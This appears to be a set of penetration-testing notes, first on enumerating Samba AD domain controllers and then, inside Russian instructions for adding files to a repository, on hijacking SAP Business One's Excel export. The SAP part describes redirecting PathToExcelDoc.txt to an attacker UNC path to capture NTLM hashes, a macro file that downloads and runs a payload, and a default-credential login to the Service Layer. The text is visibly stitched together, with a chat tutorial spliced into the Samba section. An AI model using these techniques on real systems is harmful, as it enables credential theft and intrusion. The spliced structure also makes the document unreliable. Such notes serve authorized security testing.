# Samba AD DC: Security Research & Enumeration

This section covers methodology for assessing Samba Active Directory Domain Controllers (AD DC), which are often found in mixed Linux/Windows environments. Samba AD DC differs from Windows AD in its tooling and underlying file structures.

## 1. Enumeration using Native Tools
Samba provides specific command-line utilities for administration and enumeration.

```bash
# List domain users (requires local access or valid credentials)
samba-tool user list -H /var/lib/samba/private/sam.ldb

# List domain groups
samba-tool group listmembers "Domain Admins" -H /var/lib/samba/private/sam.ldb

2. LDAP & ACL Analysis
Samba AD implements ACLs (Access Control Lists) similarly to Windows AD. Misconfigurations can lead to privilege escalation.

Tooling: Use ldapsearch or ldbsearch to query the nTSecurityDescriptor.

Impacket: Tools like dacledit.py can be used to read and modify DACLs on Samba DCs just as in Windows.

BloodHound: SharpHound can collect data from Samba if LDAP and SMB are properly configured.

3. Python Script Adaptation
Working with Samba often requires adapting existing offensive tools (like Impacket) or writing custom Python scripts using libraries like ldap3 or 
impacket
.

Example: Modifying a user's password via LDAP/RPC when standard tools fail.
(Reference: Impacket's samr.py or custom ldap3 scripts)


5. Нажми **Commit changes...** и сохрани.

---

### Шаг 2: Создаем файл про SAP B1 (Уникальный опыт)
Этот вектор (AutoOpen.XLS) — это то, что мы раскопали в ходе нашей сессии. Это очень ценно, так как мало кто из джунов знает про SAP.

1. Снова нажми **Add file** -> **Create new file**.
2. В поле имени напиши: `05_SAP_Security/sap_b1_auto_open.md`
3. Вставь этот текст:

```markdown
# SAP Business One: PathToExcelDoc & AutoOpen.XLS Abuse

This document describes an attack vector against SAP Business One clients. When a user exports data to Excel, SAP B1 uses a template file (`AutoOpen.XLS`) and reads the target path from a configuration file (`PathToExcelDoc.txt`).

## 1. The Mechanism
By default, SAP B1 looks for `AutoOpen.XLS` and `PathToExcelDoc.txt` in the shared directory (e.g., `B1_SHF`).
The `AutoOpen.XLS` contains a VBA macro (`Auto_Open()`) that reads the first line of `PathToExcelDoc.txt` and opens the specified file.

## 2. The Attack Vector
If an attacker gains write access to the SAP B1 share (e.g., via anonymous SMB write), they can hijack the export process:

1. **NTLM Capture:** Modify `PathToExcelDoc.txt` to point to a UNC path (e.g., `\\10.10.10.10\share\evil.xls`). When the SAP client tries to open it, it sends an NTLM hash to the attacker.
2. **Remote Code Execution:** Point the file to a malicious `.xls` containing a VBA macro that downloads and executes a payload.

## 3. SAP Service Layer (API)
SAP B1 Service Layer (usually on port 50001) can be exposed. Check for default credentials or known CVEs.

*Endpoint example:* `POST /b1s/v1/Login`
*Payload:* `{"CompanyDB":"DB_NAME","UserName":"manager","Password":"password"}`

# Disclaimer: Strictly for authorized testing.
